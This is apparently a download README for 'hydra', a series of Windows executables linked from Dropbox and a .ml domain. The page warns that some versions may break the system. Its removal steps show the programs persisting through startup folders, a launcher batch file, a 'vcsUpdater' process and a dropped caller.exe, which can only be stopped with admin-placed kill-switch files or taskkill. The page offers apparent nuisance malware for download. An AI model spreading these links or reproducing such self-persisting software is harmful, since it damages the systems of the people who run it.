# hydraV3 / hydraV2 / hydra

## Direct download

###### Windows11 Update WIP (backward compatible with Win10 and Win7)
  * Download latest version [here](http://hydra-latest.ml) 
  
  * Download [HydraV3](https://www.dropbox.com/s/vc2spqay5necghw/hydrav3.exe?dl=1)

###### Not compatible with Windows 11 (may break the system)
  * Download [HydraV2](https://www.dropbox.com/s/0b6lpq5zdzn0lfq/hydrav2.exe?dl=1)\
  * Download [HydraV1](https://www.dropbox.com/s/ujpl2ln1e08o3pc/hydra.exe?dl=1)

## Uninstallation

###### [hydrav3.exe](https://www.dropbox.com/s/9to311lo5jj4u9v/hydrav3.exe?dl=1)
  1. locate the directory "HYDRA_INFO" on your Desktop
  1. follow the steps in README.txt:
      1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
      1. copy or create a file identical to the other file in "HYDRA_INFO" (currently: "pleaseStopItNow") in the common startup folder. 
         This process requires you to be a System Administrator.
      1. delete "caller.exe" in %localappdata%

###### [hydrav2.exe](https://www.dropbox.com/s/0b6lpq5zdzn0lfq/hydrav2.exe?dl=1)
  1. locate the directory "HYDRA_INFO" on your Desktop
  1. follow the steps in README.txt:
      1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
      1. copy or create a file identical to the other file in "HYDRA_INFO" (currently: "pleaseStopItNow") in the common startup folder. 
         This process requires you to be a System Administrator.
      1. delete "caller.exe" in %localappdata%

###### [hydra.exe](https://www.dropbox.com/s/ujpl2ln1e08o3pc/hydra.exe?dl=1)
  1. Stop the process:
      * Option A:
          1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
          1. create a file named "pleaseStopIt" in the common startup folder.
            This process requires you to be a System Administrator.
      * Option B:
          1. open the powershell
          1. type "taskkill.exe /f /im hydra* ; taskkill.exe /f /im vcsUpdater*" and hit enter
  
  1. head over to the local startup directory by hitting WIN+R and typing "shell:startup" 
  1. Delete G3_Launcher.bat
  1. Delete vcsUpdater, hydra.exe and hydra.png (where you first executed hydra.exe)
